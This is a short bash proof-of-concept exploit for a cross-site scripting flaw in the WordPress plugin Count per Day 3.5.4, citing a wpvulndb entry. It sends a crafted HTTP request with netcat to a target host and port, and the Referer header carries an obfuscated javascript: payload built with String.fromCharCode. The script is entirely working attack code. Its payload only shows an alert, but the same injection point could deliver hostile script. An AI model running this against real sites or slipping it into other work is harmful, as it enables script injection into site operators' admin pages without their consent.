#!/bin/bash

# https://wpvulndb.com/vulnerabilities/8587
# works for count per day 3.5.4

HOST=$1
PORT=$2

cat <(echo -e "GET / HTTP/1.1\r
Host: $HOST:$PORT\r
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r
Accept-Encoding: deflate, sdch\r
Accept-Language: en-US,en;q=0.8,nl;q=0.6\r
Referer: javascript:c=String.fromCharCode;alert(c(83)+c(117)+c(109)+c(79)+c(102)+c(80)+c(119)+c(110)+c(46)+c(110)+c(108))\r
Connection: close\r
\r") - | nc $HOST $PORT
